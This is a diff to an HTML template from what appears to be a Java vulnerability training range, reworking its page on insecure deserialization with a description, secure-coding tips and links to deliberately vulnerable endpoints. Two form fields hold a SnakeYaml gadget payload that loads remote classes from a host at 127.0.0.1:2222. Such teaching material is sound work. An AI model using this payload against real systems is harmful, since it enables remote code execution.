@@ -9,43 +9,59 @@
 <div class="container-fluid">
     <div class="row">
         <!-- 侧边栏 -->
-        <div th:replace="~{commons/commons::siderbar(active='deserialize.html')}"></div>
+        <div th:replace="~{commons/commons::siderbar(active='deserialization.html')}"></div>
 
-        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
-            <div class="vul_header">
-                <span>不安全的反序列化</span>
-            </div>
-            <hr>
-            <ul class="nav nav-tabs">
-                <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span>
-                        漏洞描述</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
-                </li>
-            </ul>
-
-            <div class="tab-content">
-                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
-                    反序列化漏洞，当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码（多见于第三方组件产生的漏洞）
+        <main role="main" class="col-md-10 offset-md-2 pt-3 main">
+            <div class="card">
+                <div class="card-header py-1">
+                    <div class="vul_header">
+                        <span>不安全的反序列化</span>
+                        <span class="header_link">
+                            <a class="btn btn-sm btn-primary" target="_blank"
+                               href="#">漏洞案例</a>
+                            <a class="btn btn-sm btn-primary" target="_blank"
+                               href="#">wiki</a>
+                        </span>
+                    </div>
                 </div>
-                <div class="tab-pane fade" id="bb">
-                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder"
-                              style="height: 140px;">
- 1. 更新commons-collections、commons-io等第三方库版本。
- 2. 不要使用可以执行任意代码的类型进行反序列化。例如，不要使用 ObjectInputStream.readObject 方法进行反序列化，而应该使用安全的反序列化方法，例如 ObjectInputStream.readUnshared 方法。
- 3. 对于来源不可信的序列化数据，不要直接进行反序列化，而应该先进行校验，确保它不存在恶意代码。例如，可以对序列化数据的长度、格式进行校验，避免反序列化漏洞的发生。
-                    </textarea>
+
+                <div class="card-body">
+                    <ul class="nav nav-tabs">
+                        <li class="nav-item">
+                            <a class="nav-link active" data-toggle="tab" href="#vulDescription">
+                                漏洞描述</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" data-toggle="tab" href="#secureCoding"> 安全编码</a>
+                        </li>
+                    </ul>
+
+                    <div class="tab-content">
+                        <div class="tab-pane active" id="vulDescription">
+                            <div class="alert alert-desc"><i class="lnr lnr-alarm"></i>
+                                反序列化漏洞（Deserialization
+                                vulnerability），当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。<br></br>
+                                反序列化漏洞在许多第三方库和框架中被广泛利用。例如，Apache
+                                Commons Collections、Apache Commons Beanutils、JYaml、Jboss
+                                Marshalling、XStream、Hibernate、Spring等。
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="secureCoding">
+                            <div class="alert alert-desc">
+                                1. 更新commons-collections、commons-io等第三方库版本。<br>
+                                2. 不要使用可以执行任意代码的类型进行反序列化。例如，不要使用 ObjectInputStream.readObject 方法进行反序列化，而应该使用安全的反序列化方法，例如 ObjectInputStream.readUnshared 方法。<br>
+                                3. 对于来源不可信的序列化数据，不要直接进行反序列化，而应该先进行校验，确保它不存在恶意代码。例如，可以对序列化数据的长度、格式进行校验，避免反序列化漏洞的发生。
+                            </div>
+                        </div>
+                    </div>
+
                 </div>
             </div>
-
-            <hr>
 
             <div class="box-float">
                 <div class="float1">
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       href="/Deserialize/readObject/vul?base64=payload">
+                       href="/vulnapi/Deserialization/readObject/vul?base64=payload">
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
@@ -77,7 +93,7 @@ public String cc(String base64) {
 
 
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - SnakeYaml</span></h5>
-                    <form role="search" th:action="@{/Deserialize/yaml/vul}" method="post">
+                    <form role="search" th:action="@{/vulnapi/Deserialization/SnakeYaml/vul}" method="post">
                         <div class="input-group mb-3">
                             <input type="text" class="form-control" name="content"
                                    value="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:2222']]]]"
@@ -103,7 +119,7 @@ public void yaml(String content) {
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       href="/Deserialize/XMLDecoder/vul">
+                       href="/vulnapi/Deserialization/XMLDecoder/vul">
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
@@ -136,7 +152,7 @@ xmlDecoder.close();
 
 
                     <a style="float:right" class="btn btn-sm btn-success" target="_blank"
-                       href="/Deserialize/readObject/safe?base64=payload">
+                       href="/vulnapi/Deserialization/readObject/safe?base64=payload">
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
@@ -164,7 +180,7 @@ public String safe(String base64) {
 }
                     </textarea><br><br>
                     <h5><span class="lnr lnr-smile"> 安全代码 - SnakeYaml</span></h5>
-                    <form role="search" th:action="@{/Deserialize/yaml/safe}" method="post">
+                    <form role="search" th:action="@{/vulnapi/Deserialization/yaml/safe}" method="post">
                         <div class="input-group mb-3">
                             <input type="text" class="form-control" name="content"
                                    value="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:2222']]]]"
